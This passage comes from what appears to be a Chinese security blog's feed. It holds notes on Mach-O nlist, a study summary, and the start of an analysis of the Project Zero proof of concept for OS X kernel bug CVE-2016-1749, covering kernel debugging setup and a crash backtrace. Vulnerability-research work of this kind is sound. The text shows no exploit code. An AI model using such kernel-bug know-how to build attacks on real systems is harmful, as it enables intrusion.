<h2 id="1-2_n_desc">1.2 n_desc</h2><p>​    <code>n_desc</code>的用法与<code>n_type</code>类似，也是被掩码切分成好多块，分别表示不同的含义。用来标识重定义符一些特性。</p>
<h2 id="1-3_n_value">1.3 n_value</h2><p>​    <code>n_value</code>值的具体意义根据<code>n_type</code>、<code>n_sect</code>的变化，而拥有各自不同的含义。</p>
<h1 id="0x02_小结">0x02 小结</h1><p>其实<mach-o nlist.h="">中的注释已经解释的非常清楚了，在阅读本文之后，结合思维导图阅读源码文件，不仅可以减少理解的时间，而且可以更加系统的去理解nlist数据结构，或者有目的性的阅读与当前需求相关的部分。</mach-o></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p>在研究<code>Mach-O</code>的重定向相关内容时，就一定会遇到nlist这个数据结构，他定义在<mach-o/nlist.h>文件中，简单的对头文件中的注释做了翻译和整理，体现在图上面，nlist的数据结构看似非常简单，使用的时候却有点复杂，理解nlist的数据结构是进一步对OSX内核进行分析非常重要的一步。</p>
<p><img src="https://raw.githubusercontent.com/turingH/BLOGIMAGE/master/png/nlist/nlist%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90.png" alt="nlist分析图"></p>]]>
    
    </summary>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="dyld" scheme="http://turingh.github.io/tags/dyld/"/>
    
      <category term="mach-o" scheme="http://turingh.github.io/tags/mach-o/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[10-11-4版本小结]]></title>
    <link href="http://turingh.github.io/2016/05/23/10-11-4%E7%89%88%E6%9C%AC%E5%B0%8F%E7%BB%93/"/>
    <id>http://turingh.github.io/2016/05/23/10-11-4版本小结/</id>
    <published>2016-05-23T18:21:22.000Z</published>
    <updated>2016-05-23T18:56:05.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</code>版本的补丁中还有大量的漏洞没有研究完，又放出了新的版本，这里稍微做一下总结。</p>
<h1 id="0x01_10-11-4_小结">0x01 10.11.4 小结</h1><h2 id="1-1_基础知识">1.1 基础知识</h2><h3 id="1-1-1_macho格式学习">1.1.1 macho格式学习</h3><p>​    因为刚开始研究<code>OS X</code>系统，花了一部分时间研究了mach-o文件格式的知识，在后续的漏洞分析中发现，mach-o文件的知识还不够扎实，还会有很多似懂非懂的问题。</p>
<p><a href="http://turingh.github.io/2016/03/07/mach-o%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E5%88%86%E6%9E%90/">mach-o格式分析</a></p>
<p><a href="http://turingh.github.io/2016/03/10/Mach-O%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5/">Mach-O的动态链接相关知识</a></p>
<p><a href="http://turingh.github.io/2016/03/22/fishhook%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">fishhook源码分析</a></p>
<p><a href="http://turingh.github.io/2016/03/30/OSX%E5%86%85%E6%A0%B8%E5%8A%A0%E8%BD%BDmach-o%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">OSX内核加载mach-o流程分析</a></p>
<h3 id="1-1-2_dyld源码分析">1.1.2 dyld源码分析</h3><p><a href="http://turingh.github.io/2016/03/16/dyld%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90load/">dyld源码分析-动态加载load</a></p>
<p><a href="http://turingh.github.io/2016/03/01/dyld%E4%B8%ADmacho%E5%8A%A0%E8%BD%BD%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">dyld中mach-o文件加载的简单分析</a></p>
<h2 id="1-2漏洞分析">1.2漏洞分析</h2><p>​    主要分析了两个漏洞<a href="http://turingh.github.io/2016/04/03/CVE-2016-1757%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90/">CVE-2016-1757</a>以及<a href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/">CVE-2016-1749</a>。两个漏洞一个是应用层一个是内核层的，在分析研究漏洞的过程中，也熟悉掌握了ida，bindiff，lldb等一系列工具的实际操作。在分析另外一个内核漏洞的过程中，发现在内核框架的掌握上有比较大的缺憾，所以花了大量的时间熟悉了内核开发与一些相关部分的源码，所以有半个月时间左右没有通过日志总结学习的小结，在<code>10.11.5</code>版本的漏洞研究时将补充相关的内容。</p>
<ul>
<li>libkern c++ 运行时源码学习</li>
<li>kext内核扩展加载流程</li>
<li>iokit框架工作的原理及细节的简单深入分析</li>
<li>mach-o的dyld中重定向的代码细节</li>
</ul>
<h1 id="0x02_10-11-5_目标">0x02 10.11.5 目标</h1><ul>
<li>提高漏洞分析的能力和速度（POC构建，EXP编写）</li>
<li>提高基础能力的学习（内核源码，系统结构）</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="0x00_版本小结">0x00 版本小结</h1><p>在<code>10.11.4</code>版本开始着手研究<code>OS X</code>系统安全方面的知识，上周苹果发布了<code>10.11.5</code>版本，<code>10.11.4</cod]]>
    </summary>
    
      <category term="OS X" scheme="http://turingh.github.io/tags/OS-X/"/>
    
      <category term="OS X" scheme="http://turingh.github.io/categories/OS-X/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CVE-2016-1749内核代码执行POC分析]]></title>
    <link href="http://turingh.github.io/2016/04/29/CVE-2016-1749%E5%86%85%E6%A0%B8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8CPOC%E5%88%86%E6%9E%90/"/>
    <id>http://turingh.github.io/2016/04/29/CVE-2016-1749内核代码执行POC分析/</id>
    <published>2016-04-29T16:43:50.000Z</published>
    <updated>2016-04-29T20:37:51.000Z</updated>
    <content type="html"><![CDATA[<h1 id="0x00_摘要">0x00 摘要</h1><p><code>OS X</code>系统的10.11.4的系统补丁中修复了一个在内核中可以导致代码执行的漏洞，漏洞形成的原因是缺少了必要的边界值检测。</p>
<ul>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=728&amp;can=1&amp;q=apple&amp;sort=-id" target="_blank" rel="external">最初的漏洞报告</a></li>
<li><a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=227076" target="_blank" rel="external">POC下载</a><br>本文记录了对POC的简单的调试和分析，对该漏洞有一个初步的认识，为后续的研究做好准备工作。</li>
</ul>
<a id="more"></a>
<h1 id="0x01_准备工作">0x01 准备工作</h1><p>因为这个漏洞是一个内核级的漏洞，所以需要搭建一个内核调试的环境。</p>
<h2 id="1-1_内核调试环境的搭建">1.1 内核调试环境的搭建</h2><p>内核调试环境的搭建并不复杂，但是需要一台装有<code>OS X</code>的虚拟机，只需要下载官方的<code>Kernel Debug Kit</code>，安装并按照<code>ReadMe.html</code>中的步骤操作即可。<br>一般情况下默认路径是<code>/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/ReadMe.html</code></p>
<p><a href="https://developer.apple.com/downloads/" target="_blank" rel="external">KDK下载地址</a><br>也可以参考这篇文章<a href="http://www.freebuf.com/articles/system/90049.html" target="_blank" rel="external">OSX内核调试技巧分享</a></p>
<h2 id="1-2_利用lldb调试kernel_core_dump">1.2 利用lldb调试kernel core dump</h2><p>在默认情况下内核崩溃后会产生panic文件，记录这一次内核崩溃的最后调用栈，用来分析崩溃的原因，但是panic文件的信息量有限，而进行一次内核的动态调试步骤又比较复杂，这个时候对kernel core dump的分析是一种折中的方式。但是<code>OS X</code>系统生成的kernle core不能在本机保存需要设置一个服务器，在系统内核崩溃时会将core文件发送到服务器。</p>
<p>设置方法可以参考苹果给出的<a href="https://developer.apple.com/library/mac/technotes/tn2004/tn2118.html" target="_blank" rel="external">官方文档</a>，这里简单的叙述一下。在KDK的README文件中也有设置的步骤。</p>
<h3 id="1-2-1_设置服务器(物理机)">1.2.1 设置服务器(物理机)</h3><ul>
<li>创建core dump的文件夹</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo mkdir /PanicDumps</span><br><span class="line">Password:********</span><br><span class="line">server$ sudo chown root:wheel /PanicDumps</span><br><span class="line">server$ sudo chmod <span class="number">1777</span> /PanicDumps</span><br></pre></td></tr></table></figure>
<ul>
<li><p>启用core dump服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.kdumpd.plist</span><br><span class="line">Password:********</span><br></pre></td></tr></table></figure>
</li>
<li><p>确认服务已经开启</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server$ sudo launchctl list | grep kdump</span><br><span class="line">Password:********</span><br><span class="line"> - <span class="number">0</span>     com.apple.kdumpd</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="1-2-2_设置客户端(虚拟机)">1.2.2 设置客户端(虚拟机)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">client$ sudo nvram boot-args=<span class="string">"debug=0xd44 _panicd_ip=10.0.40.2"</span></span><br><span class="line">Password: ********</span><br></pre></td></tr></table></figure>
<p>这里的这个ip需要填物理的ip。且虚拟机可以通过该ip和物理机简历连接。</p>
<h3 id="1-2-3_使用lldb调试kernel_core">1.2.3 使用lldb调试kernel core</h3><p>当系统内核崩溃后，在物理机的<code>/PanicDumps</code>路径中会出现<code>xnu-XXX.gz</code>的文件。是通过zip压缩的。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunzip xnu-XXX.gz</span><br></pre></td></tr></table></figure></p>
<p>通过指令解压后利用lldb查看core文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a</span><br></pre></td></tr></table></figure></p>
<p>注意需要使用sudo，否则会报错。这个时候就可以看到core dump的情况进行分析了。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo lldb -c /PanicDumps/core-xnu-<span class="number">3248.30</span>.<span class="number">4</span>-<span class="number">172.16</span>.<span class="number">9.186</span>-ca2fd00a                               </span><br><span class="line">(lldb) target create --core <span class="string">"/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a"</span></span><br><span class="line">Kernel UUID: DB8A107C-<span class="number">3</span>A4F-<span class="number">31</span>AB-<span class="number">8</span>BCE-EB77F80B1CD7</span><br><span class="line">Load Address: <span class="number">0</span>xffffff8010c00000</span><br><span class="line">warning: <span class="string">'kernel'</span> contains a debug script. To run this script <span class="keyword">in</span> this debug session:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">command</span> script import <span class="string">"/Library/Developer/KDKs/KDK_10.11.3_15D13b.kdk/System/Library/Kernels/kernel.development.dSYM/Contents/Resources/DWARF/../Python/kernel.py"</span></span><br><span class="line"></span><br><span class="line">To run all discovered debug scripts <span class="keyword">in</span> this session:</span><br><span class="line"></span><br><span class="line">    settings <span class="built_in">set</span> target.load-script-from-symbol-file <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">Kernel slid <span class="number">0</span>x10a00000 <span class="keyword">in</span> memory.</span><br><span class="line">Loaded kernel file /Library/Developer/KDKs/KDK_10.<span class="number">11.3</span>_15D13b.kdk/System/Library/Kernels/kernel.development</span><br><span class="line">Loading <span class="number">97</span> kext modules warning: Can<span class="string">'t find binary/dSYM for com.apple.kec.corecrypto (D6E082B5-93B2-3FF0-AB4B-4AA310173CE8)</span><br><span class="line">.....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIPlatform (<span class="number">3</span>BE4E926-E063-<span class="number">3</span>BBD-BE05-F6F97358C7A4)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DiskImages (97177A33-27BD-34A9-9B42-1173BE480BCD)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleCredentialManager (E3817462-FFEE-<span class="number">38</span>AE-<span class="number">839</span>B-<span class="number">79932133</span>E7EF)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleMobileFileIntegrity (09620E73-2D73-3F62-9E5D-4B9DC2147F70)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleKeyStore (<span class="number">7</span>AF14D78-EEBE-<span class="number">3474</span>-B605-<span class="number">66</span>CC957F2FE5)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.security.sandbox (F3202072-6ED5-33BF-97B0-AD49F500ABF6)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAPIC (<span class="number">46368557</span>-CAF1-<span class="number">3</span>FAC-AF62-A03389987023)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMBIOS (558EB25D-8E3F-3429-B2DC-ADAE2EF0F7C3)</span><br><span class="line">...warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleACPIButtons (<span class="number">767834</span>A6-B80F-<span class="number">36</span>ED-<span class="number">9</span>C0A-A6179A144279)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleUSBHostMergeProperties (D338A98F-2B8F-3411-BD87-BD00F620A223)</span><br><span class="line">.......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleFileSystemDriver (<span class="number">998</span>B4AF6-<span class="number">388</span>A-<span class="number">304</span>E-<span class="number">9627</span>-EBB1237252F8)</span><br><span class="line">...warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.Intel82574L (92C2095F-4CB1-36CE-ACF9-518F4610AE68)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBXHCI (<span class="number">38</span>F68C79-<span class="number">811</span>D-<span class="number">3</span>AA2-B8D4-<span class="number">0</span>D444FF4DB4B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBXHCIPCI (7AC984CE-8AAA-3B8D-92E3-24BE18DF3DEC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBEHCI (FA569D7A-D439-<span class="number">32</span>EB-<span class="number">9</span>B57-<span class="number">0</span>A5D5227AC12)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBUHCI (55F5C3FB-6419-35F2-B9A3-836F696C3DBC)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBUHCIPCI (<span class="number">4</span>C589408-<span class="number">0</span>FA4-<span class="number">35</span>A0-B8BF-A65EEDFB971F)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBEHCIPCI (C2569C25-E38A-3AC0-8502-594A75E63C76)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleAHCIPort (<span class="number">20356</span>FAA-<span class="number">8898</span>-<span class="number">36</span>F8-BAAD-<span class="number">8961</span>AFC23E9B)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOAHCIBlockStorage (0A852267-0F62-363B-86D7-C2B02972EE48)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOAHCISerialATAPI (D1CA586E-<span class="number">89</span>CA-<span class="number">36</span>BE-A293-CE0BBD19367D)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleXsanScheme (00C3E9DA-99B0-3518-8B4B-38114EE146A8)</span><br><span class="line">......warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.AppleUSBHostCompositeDevice (<span class="number">3</span>E1A0840-<span class="number">033</span>C-<span class="number">321</span>B-B5ED-<span class="number">7</span>BEA6996B1E0)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.usb.AppleUSBHub (271D9C2E-FF74-3503-958E-24C554595575)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.usb.IOUSBHostHIDDevice (<span class="number">65</span>F7A241-C50F-<span class="number">3370</span>-<span class="number">9</span>CE8-<span class="number">54566</span>F0130DE)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleSMC (535447F9-30E0-39BA-A2B8-1A027DED5D53)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.vecLib.kext (E62681B7-BE2F-<span class="number">3</span>F89-<span class="number">8065</span>-<span class="number">91</span>C5C2876EBA)</span><br><span class="line">..warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOHDAFamily (3BF83381-C3DA-3EC4-BBE6-F2024D3EACC7)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDAController (AC7816C9-DEF7-<span class="number">310</span>A-B059-<span class="number">5852</span>BF07A843)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothFamily (022A55C7-EF37-3BE7-AC09-0436CDEFCE95)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOBluetoothHostControllerUSBTransport (<span class="number">67</span>B0326E-F86A-<span class="number">3</span>AEF-BE41-<span class="number">99958414</span>F094)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.VMwareGfx (00FD0C5F-0A29-3656-8718-EBF372456B8E)</span><br><span class="line">....warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHV (<span class="number">8</span>E08FFC5-<span class="number">4</span>E33-<span class="number">3</span>D66-BB9B-<span class="number">2</span>EC170B650E6)</span><br><span class="line">.....warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOBluetoothSerialManager (A6A7E1A3-4063-3C42-9984-67E3BB1A0191)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.iokit.IOSurface (<span class="number">5</span>D984125-CEC9-<span class="number">39</span>B6-BA6E-<span class="number">6</span>C6C6004552C)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.iokit.IOUserEthernet (6D2530ED-C0BC-3F64-B2FC-4490CC30BC06)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.pmtelemetry (C3F2C16A-A407-<span class="number">389</span>C-AD2B-B8582742FE5E)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.IOPlatformPluginFamily (EC53D03F-6CD9-383A-8160-33E02C141EAA)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.IOPlatformPluginLegacy (<span class="number">15</span>BBAC18-<span class="number">907</span>A-<span class="number">394</span>F-BA5B-CC40E055BA13)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.ACPI_SMC_PlatformPlugin (04F77CAB-EA07-362C-B7A2-0167D56D55BC)</span><br><span class="line">..warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleSMBusController (<span class="number">04</span>C9295B-<span class="number">23</span>E8-<span class="number">388</span>B-<span class="number">8</span>BB6-<span class="number">07</span>CC377CADD2)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.DspFuncLib (F1E07A68-221D-3ED3-A2BA-1735E0582F3F)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleHDA (<span class="number">344</span>D4A99-D22C-<span class="number">3</span>E43-<span class="number">9699</span>-<span class="number">82</span>C1B7044CE2)</span><br><span class="line">.warning: Can<span class="string">'t find binary/dSYM for com.apple.driver.AppleHDAHardwareConfigDriver (EDCBE684-9F4F-349A-9E17-D1704C26BD84)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.apple.driver.AppleOSXWatchdog (<span class="number">0</span>CE80268-ACDD-<span class="number">3</span>FCC-<span class="number">8370</span>-<span class="number">8</span>A041468F898)</span><br><span class="line">....warning: Can<span class="string">'t find binary/dSYM for com.vmware.kext.vmmemctl (C2161D7F-F967-3406-A377-CD7D11EDE95A)</span><br><span class="line">.warning: Can'</span>t find binary/dSYM <span class="keyword">for</span> com.vmware.kext.vmhgfs (<span class="number">22192699</span>-<span class="number">95</span>BC-<span class="number">3</span>ACC-<span class="number">96</span>B1-<span class="number">023</span>E6C6073AA)</span><br><span class="line">.. done.</span><br><span class="line">Core file <span class="string">'/PanicDumps/core-xnu-3248.30.4-172.16.9.186-ca2fd00a'</span> (x86_64) was loaded.</span><br><span class="line">(lldb) bt</span><br><span class="line">IOUSBFamily was compiled with optimization - stepping may behave oddly; variables may not be available.</span><br><span class="line">* thread <span class="comment">#1: tid = 0x0000, 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181, stop reason = signal SIGSTOP</span></span><br><span class="line">  * frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">    frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">    frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">    frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">    frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">    frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">    frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">    frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">    frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">    frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure></p>
<p>可以清楚的看到系统崩溃时的调用栈了。这个栈就是POC程序在虚拟机中执行后返回的结果。</p>
<h1 id="0x02_POC崩溃现场分析">0x02 POC崩溃现场分析</h1><p>通过对POC执行后崩溃的现场，可以得知具体的崩溃原因，已经函数的调用顺序，这样在做动态分析和静态分析的时候才能有的放矢。</p>
<h2 id="2-1_调用栈分析">2.1 调用栈分析</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">* frame <span class="comment">#0: 0xffffff7f91b11581 IOUSBFamily`AppleUSBPipe::Abort(this=&lt;unavailable&gt;, streamID=&lt;unavailable&gt;) + 153 at AppleUSBPipe.cpp:1181 [opt]</span></span><br><span class="line">  frame <span class="comment">#1: 0xffffff7f91b01197 IOUSBFamily`IOUSBInterfaceUserClient::AbortStreamsPipe(this=&lt;unavailable&gt;, pipeRef=&lt;unavailable&gt;, streamID=4042322160) + 305 at IOUSBInterfaceUserClient.cpp:3656 [opt]</span></span><br><span class="line">  frame <span class="comment">#2: 0xffffff7f91afbcf9 IOUSBFamily`IOUSBInterfaceUserClient::_AbortStreamsPipe(target=&lt;unavailable&gt;, reference=&lt;unavailable&gt;, arguments=&lt;unavailable&gt;) + 241 at IOUSBInterfaceUserClient.cpp:3636 [opt]</span></span><br><span class="line">  frame <span class="comment">#3: 0xffffff80112b9c17 kernel.development`::is_io_connect_method(connection=0xffffff801a719c00, selector=36, scalar_input=&lt;unavailable&gt;, scalar_inputCnt=&lt;unavailable&gt;, inband_input=&lt;unavailable&gt;, inband_inputCnt=0, ool_input=&lt;unavailable&gt;, ool_input_size=&lt;unavailable&gt;, inband_output=&lt;unavailable&gt;, inband_outputCnt=&lt;unavailable&gt;, scalar_output=&lt;unavailable&gt;, scalar_outputCnt=&lt;unavailable&gt;, ool_output=&lt;unavailable&gt;, ool_output_size=&lt;unavailable&gt;) + 487 at IOUserClient.cpp:3720 [opt]</span></span><br><span class="line">  frame <span class="comment">#4: 0xffffff8010d5cfc0 kernel.development`_Xio_connect_method(InHeadP=&lt;unavailable&gt;, OutHeadP=0xffffff80195c55d0) + 384 at device_server.c:8255 [opt]</span></span><br><span class="line">  frame <span class="comment">#5: 0xffffff8010c88ee3 kernel.development`ipc_kobject_server(request=0xffffff801c7f3be0) + 259 at ipc_kobject.c:340 [opt]</span></span><br><span class="line">  frame <span class="comment">#6: 0xffffff8010c64e13 kernel.development`ipc_kmsg_send(kmsg=&lt;unavailable&gt;, option=&lt;unavailable&gt;, send_timeout=0) + 195 at ipc_kmsg.c:1441 [opt]</span></span><br><span class="line">  frame <span class="comment">#7: 0xffffff8010c7b435 kernel.development`mach_msg_overwrite_trap(args=&lt;unavailable&gt;) + 197 at mach_msg.c:470 [opt]</span></span><br><span class="line">  frame <span class="comment">#8: 0xffffff8010d83850 kernel.development`mach_call_munger64(state=0xffffff801b6471e0) + 480 at bsd_i386.c:560 [opt]</span></span><br><span class="line">  frame <span class="comment">#9: 0xffffff8010db9516 kernel.development`hndl_mach_scall64 + 22</span></span><br></pre></td></tr></table></figure>
